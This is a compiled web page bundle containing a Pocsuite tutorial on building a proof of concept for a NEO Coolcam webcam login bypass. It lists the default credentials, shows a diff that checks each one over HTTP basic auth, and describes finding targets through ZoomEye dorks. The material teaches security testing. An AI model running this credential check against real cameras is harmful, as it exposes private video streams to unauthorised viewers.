import{_ as s}from"./chunks/poc-demo-camera-auth-bypass_verify.e8d89554.js";import{_ as a,j as n,g as e,H as l}from"./chunks/framework.8815fd6f.js";const C=JSON.parse('{"title":"Webcam Login Bypass","description":"","frontmatter":{},"headers":[{"level":2,"title":"PoC development","slug":"poc-development"},{"level":2,"title":"Vulnerability verification","slug":"vulnerability-verification"}],"relativePath":"en/guide/poc-demo-camera-auth-bypass.md","lastUpdated":1658474088000}'),p={name:"en/guide/poc-demo-camera-auth-bypass.md"},o=l(`<h1 id="webcam-login-bypass" tabindex="-1">Webcam Login Bypass <a class="header-anchor" href="#webcam-login-bypass" aria-hidden="true">#</a></h1><p>Vulnerability details: <a href="https://paper.seebug.org/652/" target="_blank" rel="noreferrer">ZoomEye Data Analysis Report - NEO Coolcam&#39;s Webcam Vulnerabilities</a></p><p>The Webcam Web service is based on HTTP basic authentication. There are three groups of default credentials which correspond to different permission levels. The three groups of default credentials are: <code>admin:admin</code>, <code>user:user</code>, <code>guest:guest</code>. During installation, the APP will only remind users to modify the default password of the admin account.</p><p>It is worth mentioning that the user account and guest account can also view the video stream, and most users will not modify the default passwords of these accounts, resulting in privacy leakage.</p><h2 id="poc-development" tabindex="-1">PoC development <a class="header-anchor" href="#poc-development" aria-hidden="true">#</a></h2><p>Generate template.</p><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u279C pocsuite --new</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"><span style="color:#A6ACCD;">0    Arbitrary File Read</span></span>
<span class="line"><span style="color:#A6ACCD;">1    Code Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">2    Command Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">3    Denial Of service</span></span>
<span class="line"><span style="color:#A6ACCD;">4    Information Disclosure</span></span>
<span class="line"><span style="color:#A6ACCD;">5    Login Bypass</span></span>
<span class="line"><span style="color:#A6ACCD;">6    Path Traversal</span></span>
<span class="line"><span style="color:#A6ACCD;">7    SQL Injection</span></span>
<span class="line"><span style="color:#A6ACCD;">8    SSRF</span></span>
<span class="line"><span style="color:#A6ACCD;">9    XSS</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability type, choose from above or provide </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 3</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: 5</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"></span></code></pre></div><p>Modify the template.</p><div class="language-diff"><span class="copy"></span><pre><code><span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">    def _options(self):</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        o = OrderedDict()</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        o[&#39;param&#39;] = OptString(&#39;&#39;, description=&#39;The param&#39;)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        return o</span></span>
<span class="line"><span style="color:#89DDFF;">-</span></span>
<span class="line"><span style="color:#A6ACCD;">     def _exploit(self, param=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        if not self._check(dork=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        if not self._check(dork=&#39;Error: username or password error,please input again.&#39;):</span></span>
<span class="line"><span style="color:#A6ACCD;">             return False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        headers = {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        payload = &#39;a=b&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        res = requests.post(self.url, headers=headers, data=payload)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        logger.debug(res.text)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        return res.text</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        creds = {&#39;admin&#39;: &#39;admin&#39;, &#39;user&#39;: &#39;user&#39;, &#39;guest&#39;: &#39;guest&#39;}</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        valid_creds = {}</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        for u, p in creds.items():</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            res = requests.get(self.url, auth=(u, p))</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            if res.status_code != 401:</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">                valid_creds[u] = p</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        return valid_creds</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">     def _verify(self):</span></span>
<span class="line"><span style="color:#A6ACCD;">         result = {}</span></span>
<span class="line"><span style="color:#89DDFF;">@@</span><span style="color:#A6ACCD;"> -53,17 +48,11 </span><span style="color:#89DDFF;">@@</span><span style="color:#A6ACCD;"> class DemoPOC(POCBase):</span></span>
<span class="line"><span style="color:#A6ACCD;">         if res:</span></span>
<span class="line"><span style="color:#A6ACCD;">             result[&#39;VerifyInfo&#39;] = {}</span></span>
<span class="line"><span style="color:#A6ACCD;">             result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">            result[&#39;VerifyInfo&#39;][param] = res</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            result[&#39;VerifyInfo&#39;][&#39;Info&#39;] = res</span></span>
<span class="line"><span style="color:#A6ACCD;">         return self.parse_output(result)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">     def _attack(self):</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        result = {}</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        param = self.get_option(&#39;param&#39;)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        res = self._exploit(param)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        result[&#39;VerifyInfo&#39;] = {}</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        result[&#39;VerifyInfo&#39;][param] = res</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        return self.parse_output(result)</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        return self._verify()</span></span>
<span class="line"></span>
<span class="line"></span></code></pre></div><h2 id="vulnerability-verification" tabindex="-1">Vulnerability verification <a class="header-anchor" href="#vulnerability-verification" aria-hidden="true">#</a></h2><p>Use <code>--dork-zoomeye</code> to specify keywords to retrieve targets from ZoomEye for detection.</p><p><img src="`+s+'" alt=""></p>',12),r=[o];function t(c,i,y,D,d,u){return e(),n("div",null,r)}var m=a(p,[["render",t]]);export{C as __pageData,m as default};
